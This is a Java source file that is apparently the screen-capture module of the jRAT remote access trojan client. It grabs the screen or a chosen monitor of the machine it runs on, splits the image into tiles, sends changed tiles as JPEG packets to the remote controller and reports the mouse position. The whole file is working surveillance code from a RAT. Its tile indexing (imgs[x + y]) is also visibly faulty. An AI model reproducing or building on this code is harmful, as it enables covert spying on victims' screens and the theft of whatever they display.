package jrat.module.screen;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;
import jrat.client.packets.outgoing.Packet26RemoteScreen;
import jrat.client.packets.outgoing.Packet68RemoteScreenComplete;
import jrat.client.utils.ScreenUtils;
import jrat.common.utils.ImageUtils;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;

public class Screen extends Thread {

	public static Screen instance;

	private Connection con;
	private int size;
	private int quality;
	private int monitor;
	private int rows;
	private int columns;

	public static BufferedImage[] prevSums = new BufferedImage[0];

	public Screen(Connection con, int size, int quality, int monitor, int columns, int rows) {
		super("Screen capture thread");
		Screen.instance = this;
		this.con = con;
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
		this.columns = columns;
		this.rows = rows;
	}

	@Override
	public void run() {
		try {
			double scaledSize = size / 100D;

			BufferedImage image;
			Rectangle screenBounds;

			if (monitor == -1) {
				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
				image = ScreenUtils.getDefault().createScreenCapture(screenBounds);
			} else {
				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
				Robot robot = new Robot(screen);
				screenBounds = screen.getDefaultConfiguration().getBounds();
				image = robot.createScreenCapture(screenBounds);
			}

			if (scaledSize == 0D) {
				scaledSize = 0.1D;
			}

			if (scaledSize != 1.0D) {
				image = ImageUtils.resize(image, scaledSize);
			}

			PointerInfo a = MouseInfo.getPointerInfo();
			Point b = a.getLocation();
			int mouseX = (int) b.getX();
			int mouseY = (int) b.getY();

			int scaledMouseX = (int) (mouseX * scaledSize);
			int scaledMouseY = (int) (mouseY * scaledSize);

			OutgoingPacket packet;

			int chunkWidth = image.getWidth() / columns;
			int chunkHeight = image.getHeight() / rows;

			BufferedImage imgs[] = new BufferedImage[columns * rows];

			if (prevSums == null || prevSums.length != columns * rows) {
				prevSums = new BufferedImage[columns * rows];
			}

			int is = 0;
			
			
			for (int x = 0; x < rows; x++) {
				for (int y = 0; y < columns; y++) {
					BufferedImage i;
					imgs[x + y] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());
					Graphics2D gr = imgs[x + y].createGraphics();
					gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);
					gr.dispose();

					boolean update = false;

					BufferedImage prev = prevSums[is];

					try {
						if (!compare(prev, i)) {
							update = true;
						}
					} catch (ArrayIndexOutOfBoundsException e) {
						update = true;
					} catch (Exception e) {
						e.printStackTrace();
					}
					
					ByteArrayOutputStream bss = new ByteArrayOutputStream();
					 
					ImageIO.write(i, "jpg", bss);
					byte[] buffer = bss.toByteArray();

					prevSums[is++] = i;

					if (update) {
						packet = new Packet26RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);

						con.addToSendQueue(packet);
					}
				}
			}
			con.addToSendQueue(new Packet68RemoteScreenComplete(scaledMouseX, scaledMouseY));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public boolean compare(BufferedImage image1, BufferedImage image2) {
		if (image1 == null) {
			return false;
		}
		boolean b = true;
		int x1 = image1.getWidth();
		int y1 = image1.getHeight();
		for (int x = 0; x < x1; x += 16) {
			for (int y = 0; y < y1; y += 16) {
				int p1 = image1.getRGB(x, y);
				int p2 = image2.getRGB(x, y);
				if (p1 != p2) {
					//image2.setRGB(x, y, Color.RED.getRGB());
					b = false;
				}
			}
		}
		
		return b;
	}

	public int getImageSize() {
		return size;
	}

	public void setImageSize(int size) {
		this.size = size;
	}

	public int getQuality() {
		return quality;
	}

	public void setQuality(int quality) {
		this.quality = quality;
	}

	public int getMonitor() {
		return monitor;
	}

	public void setMonitor(int monitor) {
		this.monitor = monitor;
	}

}
